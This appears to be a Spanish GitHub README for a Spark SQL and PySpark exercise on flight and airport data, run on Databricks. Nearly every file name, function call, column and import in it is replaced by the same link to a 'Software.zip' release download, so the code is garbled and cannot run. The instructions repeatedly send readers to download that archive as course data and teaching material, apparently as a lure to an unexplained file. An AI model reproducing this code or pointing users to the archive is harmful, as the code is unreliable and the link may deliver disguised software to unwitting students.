# Spark CP4 M4
Resolucion CP M4 con SPARK SQL Y PYSPARK usando Databrics Community que es gratis.

# Contenido
- "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip", "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip": fuente de datos
- "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip": notebook con el codigo fuente

# Databrics
- Crear un cluster, usando Compute
- Abrir notebook ""https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip", usando Worrksapce / import / File
- En el Notebook, usar menu File / Upload data DBFS para añair "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip", y "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip"

Nota: Para usar databricks, usen este material del docente del curso.
https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip

# Explicacion del codigo
Usando Spark, creamos dos dataframes
```
df1 = https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip")
df2 = https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("csv").option("header", "true").load("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip")
```
Para ver el esquema del dataframe "flight"
```
https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip()
https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip(2)
```
```
root
 |-- DayofMonth: integer (nullable = true)
 |-- DayOfWeek: integer (nullable = true)
 |-- Carrier: string (nullable = true)
 |-- OriginAirportID: integer (nullable = true)
 |-- DestAirportID: integer (nullable = true)
 |-- DepDelay: integer (nullable = true)
 |-- ArrDelay: integer (nullable = true)
```
```
+----------+---------+-------+---------------+-------------+--------+--------+
|DayofMonth|DayOfWeek|Carrier|OriginAirportID|DestAirportID|DepDelay|ArrDelay|
+----------+---------+-------+---------------+-------------+--------+--------+
|        30|        4|     UA|          13930|        10721|      -3|      -7|
|        30|        4|     UA|          11618|        12892|      -1|     -28|
+----------+---------+-------+---------------+-------------+--------+--------+
```
Para ver el esquema del dataframe "airport"
```
https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip()
https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip(2)
```
```
root
 |-- airport_id: string (nullable = true)
 |-- city: string (nullable = true)
 |-- state: string (nullable = true)
 |-- name: string (nullable = true)
```
```
+----------+-----------+-----+--------------------+
|airport_id|       city|state|                name|
+----------+-----------+-----+--------------------+
|     10165|Adak Island|   AK|                Adak|
|     10299|  Anchorage|   AK|Ted Stevens Ancho...|
+----------+-----------+-----+--------------------+
```
Observamos que el dataframe "flight", los tipos de datos son correctos, al igual que el dataframe "airport".

Ahora creamos VISTA por cada DataFrame, las vista son como tablas que podemos hacer INNER JOIN
```
https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("flights")
https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("airports")
```
17) ¿Cuál es la tupla de aeropuertos, con mayor cantidad de vuelos entre sí?
Nota: Es posible tomar el nombre del aeropuerto desde el archivo "https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip", donde "airport_id" se puede relacionar con "OriginAirportID" y "DestAirportID" de la tabla "flights"

1- Honolulu International - Kahului Airport

2- San Francisco International - Los Angeles International

3- Los Angeles International - McCarran International

Resolviendo usando SPARK SQL:
```
https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip(""" 
SELECT https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip as origen, https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip as destino, COUNT(*) as cantidad
FROM flights f
INNER JOIN airports a1 ON https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip = https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip
INNER JOIN airports a2 ON https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip = https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip
GROUP BY https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip, https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip
ORDER BY 3 DESC
LIMIT 5
           """).show(truncate=False)
```
```
+---------------------------+---------------------------+--------+
|origen                     |destino                    |cantidad|
+---------------------------+---------------------------+--------+
|San Francisco International|Los Angeles International  |9367    |
|Los Angeles International  |San Francisco International|9306    |
|Kahului Airport            |Honolulu International     |6891    |
|Los Angeles International  |McCarran International     |6861    |
|Honolulu International     |Kahului Airport            |6856    |
+---------------------------+---------------------------+--------+
```

Ahora resolviendo usando PYSPARK:
```
from https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip import sum,avg,max,count
from https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip import col

https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("f") \
    .join(https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("a1"), col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip") == col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip"), "inner") \
    .join(https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip("a2"), col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip") == col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip"), "inner") \
    .select(col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip").alias("origen"), col("https://github.com/leydypenaloza/Spark-CP4-M4/releases/download/v2.0/Software.zip").alias("destino")) \
    .groupBy(col("origen"), col("destino")) \
    .agg(count("*").alias("cantidad")) \
    .orderBy(col("cantidad"), ascending = False) \
    .show(5, truncate=False)
```
```
+---------------------------+---------------------------+--------+
|origen                     |destino                    |cantidad|
+---------------------------+---------------------------+--------+
|San Francisco International|Los Angeles International  |9367    |
|Los Angeles International  |San Francisco International|9306    |
|Kahului Airport            |Honolulu International     |6891    |
|Los Angeles International  |McCarran International     |6861    |
|Honolulu International     |Kahului Airport            |6856    |
+---------------------------+---------------------------+--------+
```
En ambos casos nos da el mismo resultado.
